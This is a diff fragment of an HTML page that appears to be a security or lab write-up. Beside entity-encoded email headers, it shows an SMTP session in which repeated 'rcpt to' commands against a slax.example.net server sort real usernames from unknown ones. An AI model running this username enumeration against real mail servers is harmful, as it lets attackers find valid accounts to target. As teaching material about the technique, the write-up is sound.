-</span><span class='line'>From: Bill Sikes &lt;a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#x73;&#105;&#x6b;&#101;&#115;&#x40;&#115;&#x6c;&#97;&#x78;&#46;&#101;&#x78;&#x61;&#109;&#x70;&#x6c;&#x65;&#46;&#x6e;&#x65;&#x74;">&#115;&#x69;&#107;&#x65;&#x73;&#x40;&#115;&#x6c;&#97;&#120;&#x2e;&#x65;&#120;&#x61;&#109;&#112;&#x6c;&#x65;&#46;&#x6e;&#x65;&#x74;&lt;/a>
-</span><span class='line'>Message-Id: &lt;a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#50;&#48;&#48;&#x38;&#48;&#49;&#x31;&#51;&#50;&#51;&#52;&#55;&#x2e;&#x6d;&#x30;&#x44;&#x4e;&#x6c;&#109;&#68;&#x49;&#x30;&#48;&#x39;&#x36;&#51;&#x35;&#64;&#x73;&#108;&#x61;&#120;&#46;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#46;&#x6e;&#101;&#116;">&#50;&#x30;&#x30;&#x38;&#x30;&#x31;&#49;&#51;&#50;&#51;&#x34;&#x37;&#46;&#x6d;&#x30;&#x44;&#x4e;&#108;&#x6d;&#68;&#73;&#x30;&#x30;&#x39;&#x36;&#51;&#x35;&#64;&#x73;&#108;&#97;&#x78;&#x2e;&#x65;&#120;&#97;&#109;&#112;&#x6c;&#101;&#46;&#110;&#x65;&#116;&lt;/a>
+</span><span class='line'>From: Bill Sikes &lt;a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#115;&#x69;&#107;&#x65;&#115;&#64;&#115;&#x6c;&#97;&#120;&#46;&#101;&#x78;&#97;&#109;&#x70;&#x6c;&#101;&#x2e;&#110;&#101;&#x74;">&#115;&#105;&#x6b;&#101;&#115;&#x40;&#x73;&#x6c;&#x61;&#x78;&#46;&#x65;&#120;&#97;&#x6d;&#112;&#x6c;&#x65;&#46;&#x6e;&#x65;&#x74;&lt;/a>
+</span><span class='line'>Message-Id: &lt;a href="&#109;&#x61;&#105;&#x6c;&#x74;&#111;&#x3a;&#x32;&#x30;&#x30;&#x38;&#48;&#x31;&#x31;&#51;&#50;&#51;&#x34;&#x37;&#46;&#109;&#x30;&#x44;&#x4e;&#x6c;&#109;&#68;&#73;&#48;&#x30;&#x39;&#54;&#51;&#53;&#x40;&#x73;&#108;&#97;&#120;&#x2e;&#x65;&#x78;&#x61;&#109;&#112;&#x6c;&#101;&#x2e;&#110;&#x65;&#x74;">&#50;&#48;&#48;&#x38;&#x30;&#x31;&#x31;&#x33;&#x32;&#51;&#x34;&#x37;&#46;&#x6d;&#48;&#x44;&#x4e;&#108;&#x6d;&#68;&#x49;&#48;&#x30;&#x39;&#x36;&#x33;&#x35;&#64;&#x73;&#108;&#x61;&#120;&#46;&#101;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#110;&#x65;&#116;&lt;/a>
 </span><span class='line'>Date: Sun, 13 Jan 2008 23:47:48 +0000
-</span><span class='line'>To: &lt;a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x70;&#105;&#114;&#114;&#105;&#112;&#64;&#115;&#x6c;&#97;&#120;&#46;&#x65;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#x2e;&#x6e;&#x65;&#116;">&#112;&#x69;&#114;&#114;&#105;&#x70;&#x40;&#x73;&#108;&#97;&#x78;&#x2e;&#101;&#x78;&#x61;&#109;&#112;&#x6c;&#101;&#46;&#110;&#x65;&#116;&lt;/a>
+</span><span class='line'>To: &lt;a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#112;&#x69;&#x72;&#x72;&#105;&#112;&#64;&#115;&#108;&#97;&#120;&#46;&#101;&#120;&#x61;&#x6d;&#x70;&#108;&#101;&#x2e;&#110;&#101;&#116;">&#112;&#x69;&#x72;&#x72;&#x69;&#112;&#64;&#x73;&#108;&#97;&#x78;&#x2e;&#101;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#x6e;&#x65;&#x74;&lt;/a>
 </span><span class='line'>Subject: Raises
 </span><span class='line'>User-Agent: nail 11.25 7/29/05
 </span><span class='line'>MIME-Version: 1.0
@@ -898,12 +1215,12 @@ we generate the potential login names:</p>
 <span class='line-number'>8</span>
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mail from: &lt;a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x61;&#x40;&#115;&#x6c;&#x61;&#120;&#x2e;&#101;&#x78;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#x6e;&#101;&#x74;">&#97;&#64;&#x73;&#x6c;&#x61;&#x78;&#x2e;&#x65;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#x2e;&#110;&#x65;&#116;&lt;/a>
-</span><span class='line'>250 2.1.0 &lt;a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#97;&#x40;&#115;&#x6c;&#97;&#x78;&#46;&#101;&#120;&#x61;&#109;&#x70;&#108;&#x65;&#46;&#x6e;&#101;&#116;&#x2e;&#x2e;&#x2e;">&#x61;&#64;&#x73;&#x6c;&#97;&#120;&#46;&#101;&#x78;&#x61;&#109;&#112;&#x6c;&#x65;&#46;&#110;&#x65;&#x74;&#46;&#46;&#x2e;&lt;/a> Sender ok
-</span><span class='line'>rcpt to: &lt;a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#98;&#98;&#97;&#x6e;&#116;&#101;&#x72;&#x40;&#115;&#x6c;&#x61;&#x78;&#x2e;&#x65;&#x78;&#97;&#109;&#112;&#x6c;&#101;&#x2e;&#x6e;&#101;&#116;">&#x62;&#x62;&#97;&#110;&#116;&#x65;&#x72;&#64;&#x73;&#x6c;&#x61;&#x78;&#x2e;&#101;&#120;&#x61;&#109;&#x70;&#108;&#x65;&#46;&#110;&#x65;&#x74;&lt;/a>
-</span><span class='line'>250 2.1.5 &lt;a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x62;&#x62;&#x61;&#x6e;&#x74;&#101;&#114;&#x40;&#x73;&#108;&#97;&#x78;&#x2e;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x6e;&#x65;&#116;&#x2e;&#46;&#x2e;">&#98;&#98;&#x61;&#x6e;&#x74;&#101;&#x72;&#x40;&#x73;&#x6c;&#x61;&#120;&#x2e;&#x65;&#120;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#110;&#x65;&#116;&#46;&#x2e;&#46;&lt;/a> Recipient ok
+</pre></td><td class='code'><pre><code class=''><span class='line'>mail from: &lt;a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x61;&#x40;&#x73;&#108;&#x61;&#120;&#46;&#x65;&#120;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#110;&#x65;&#116;">&#x61;&#64;&#x73;&#108;&#x61;&#120;&#46;&#x65;&#120;&#x61;&#109;&#x70;&#x6c;&#x65;&#x2e;&#110;&#x65;&#116;&lt;/a>
+</span><span class='line'>250 2.1.0 &lt;a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#97;&#x40;&#115;&#108;&#97;&#120;&#x2e;&#101;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#46;&#x6e;&#101;&#x74;&#46;&#x2e;&#46;">&#97;&#64;&#115;&#108;&#x61;&#120;&#x2e;&#101;&#x78;&#97;&#109;&#112;&#108;&#101;&#46;&#110;&#x65;&#116;&#46;&#46;&#x2e;&lt;/a> Sender ok
+</span><span class='line'>rcpt to: &lt;a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#98;&#98;&#97;&#110;&#116;&#101;&#x72;&#x40;&#115;&#108;&#x61;&#x78;&#46;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x6e;&#101;&#116;">&#x62;&#x62;&#x61;&#x6e;&#116;&#101;&#x72;&#64;&#115;&#x6c;&#x61;&#120;&#x2e;&#101;&#x78;&#97;&#109;&#112;&#x6c;&#101;&#x2e;&#x6e;&#x65;&#116;&lt;/a>
+</span><span class='line'>250 2.1.5 &lt;a href="&#109;&#x61;&#105;&#108;&#116;&#111;&#58;&#98;&#98;&#97;&#x6e;&#116;&#101;&#114;&#64;&#x73;&#x6c;&#x61;&#x78;&#x2e;&#x65;&#x78;&#x61;&#x6d;&#x70;&#108;&#101;&#x2e;&#x6e;&#x65;&#x74;&#46;&#46;&#46;">&#98;&#x62;&#97;&#110;&#x74;&#101;&#114;&#64;&#115;&#x6c;&#x61;&#x78;&#46;&#101;&#120;&#x61;&#x6d;&#112;&#108;&#101;&#x2e;&#110;&#x65;&#x74;&#x2e;&#46;&#x2e;&lt;/a> Recipient ok
 </span><span class='line'>rcpt to: bbanter
-</span><span class='line'>250 2.1.5 &lt;a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#98;&#x62;&#x61;&#x6e;&#116;&#101;&#x72;&#64;&#115;&#108;&#x61;&#120;&#46;&#101;&#120;&#x61;&#109;&#112;&#108;&#101;&#x2e;&#110;&#x65;&#x74;&#46;&#x2e;&#x2e;">&#98;&#98;&#x61;&#x6e;&#x74;&#101;&#114;&#64;&#x73;&#108;&#x61;&#x78;&#46;&#x65;&#120;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#x6e;&#x65;&#x74;&#46;&#x2e;&#46;&lt;/a> Recipient ok
+</span><span class='line'>250 2.1.5 &lt;a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#x62;&#x62;&#x61;&#x6e;&#116;&#101;&#114;&#x40;&#x73;&#108;&#x61;&#x78;&#46;&#x65;&#x78;&#97;&#x6d;&#x70;&#108;&#101;&#46;&#x6e;&#x65;&#x74;&#46;&#x2e;&#x2e;">&#98;&#98;&#x61;&#x6e;&#x74;&#x65;&#x72;&#64;&#x73;&#x6c;&#x61;&#120;&#46;&#x65;&#x78;&#x61;&#x6d;&#112;&#x6c;&#101;&#46;&#110;&#101;&#116;&#46;&#46;&#x2e;&lt;/a> Recipient ok
 </span><span class='line'>rcpt to: aadam
 </span><span class='line'>550 5.1.1 aadam&hellip; User unknown
 </span><span class='line'>rcpt to: aadams
